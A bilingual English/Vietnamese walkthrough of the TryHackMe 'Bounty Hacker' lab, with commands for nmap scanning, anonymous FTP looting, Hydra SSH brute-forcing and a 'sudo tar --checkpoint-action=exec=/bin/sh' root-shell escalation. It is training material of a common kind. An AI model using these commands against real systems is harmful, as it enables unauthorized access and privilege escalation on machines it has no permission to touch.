
## TL;DR (Quick summary)  
- Boot2root style box: enumerate → anonymous FTP → collect wordlist → brute SSH → get user flag → abuse `sudo tar` to get root.  
( Tóm tắt: quét → FTP anonymous → lấy danh sách mật khẩu → brute SSH → lấy flag user → lợi dụng `sudo tar` để lên root. )

---

## Goals / Objectives  
1. Find `user.txt` (user flag). (Tìm `user.txt`.)  
2. Find `root.txt` (root flag). (Tìm `root.txt`.)  

---

## Environment & Tools  
- Kali / Parrot / AttackBox (terminal)  
- nmap, ftp, hydra (or similar), ssh, tar  
( **Môi trường & công cụ:** Kali / Parrot / AttackBox, nmap, ftp, hydra, ssh, tar )

---

## 1) Enumeration — Nmap
**Command**
```bash
sudo nmap -sV -sC -v -oN nmap_initial <TARGET_IP>
```
**What we expect**
- Found open ports: `21/tcp (ftp)`, `22/tcp (ssh)`, `80/tcp (http)`.  
( Kết quả mong đợi: port mở: 21 (ftp), 22 (ssh), 80 (http). )

---

## 2) Visit web (port 80)
- Open `http://<TARGET_IP>` in browser. The page is simple (banner / theme) and doesn't immediately expose credentials.  
( Mở trang web, chỉ có banner/giao diện, không thấy creds ngay lập tức. )

---

## 3) FTP — try anonymous
**Commands**
```bash
ftp <TARGET_IP>
# when prompted:
# username: anonymous
# password: anything (or press enter)
ls -la
get locks.txt
get task.txt
quit
```
**Notes**
- Anonymous FTP allowed. We find `locks.txt` (a password list/munge list) and `task.txt` (contains author info / hints).  
( FTP anonymous cho phép. Tìm thấy `locks.txt` (danh sách mật khẩu) và `task.txt` (thông tin/gợi ý). )

---

## 4) Read the files
```bash
cat task.txt     # contains author / clue (e.g., name "lin")
less locks.txt   # contains many candidate password variations
```
**Use**
- `task.txt` reveals the username to try (e.g., `lin`).  
- `locks.txt` is used as a password list for brute forcing SSH.  
( `task.txt` lộ username (ví dụ `lin`). `locks.txt` làm wordlist cho brute SSH. )

---

## 5) Bruteforce SSH with Hydra (or similar)
**Command**
```bash
hydra -l lin -P locks.txt ssh://<TARGET_IP>
```
**Result**
- Hydra finds the password for `lin` (in writeups it's commonly reported as an example).  

---

## 6) SSH in as lin (user)
**Command**
```bash
ssh lin@<TARGET_IP>
# password: <found_password>
```
**After login**
```bash
whoami
ls -la
cat user.txt            # get user flag
```
**Example user flag**
```
THM{EXAMPLE_USER_FLAG}
```
( SSH đăng nhập bằng tài khoản `lin`, cat `user.txt` để lấy flag user. )

---

## 7) Privilege Escalation — sudo rights
**Check sudo rights**
```bash
sudo -l
```
- You should see that `lin` can run `tar` with `sudo` (i.e., `lin ALL=(root) NOPASSWD: /bin/tar` or similar).  
( Chạy `sudo -l` để kiểm tra; tài khoản `lin` có quyền chạy `tar` bằng sudo.)

---

## 8) Abuse `tar` via GTFOBins to spawn root shell
**Why this works**
- GNU `tar` supports `--checkpoint` and `--checkpoint-action=exec` which can be used to execute a command as the running user; if run under `sudo` it runs as root. GTFOBins documents this exact technique.  
( `tar` có tuỳ chọn `--checkpoint-action=exec` để thực thi lệnh; nếu chạy bằng `sudo` thì lệnh đó sẽ chạy với quyền root — chiêu này có trên GTFOBins.)
- Hoặc lên trang GTFOsbins để tìm payload

**Command (get root shell)**
```bash
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
# now you should have a root shell
whoami   # should output: root
cat /root/root.txt
```
**Example root flag**
```
THM{EXAMPLE_ROOT_FLAG}
```
( Dùng `sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh` để spawn shell root, rồi `cat /root/root.txt` để lấy flag root. )

---

## 9) Cleanup & notes
- All steps above follow standard enumeration → exploit flow. If `tar` trick doesn't work, re-check `sudo -l` output and verify GNU tar presence. Alternative escalation vectors: search for SUID binaries, writable files, scheduled jobs, etc. Tools like `linpeas` help enumerate faster.  
( Nếu chiêu `tar` không ăn, kiểm tra lại `sudo -l` và đảm bảo có GNU tar. Ngoài ra tìm kiếm SUID, cron, file writable; `linpeas` hỗ trợ tự động enum. )

---

## References / Further reading
- TryHackMe — Bounty Hacker room page.  
- GTFOBins — tar (privilege escalation technique).  
- Community writeups and walkthroughs (InfosecWriteups, Medium, blogs).  
( Tham khảo: trang TryHackMe, GTFOBins, các writeup cộng đồng. )

---

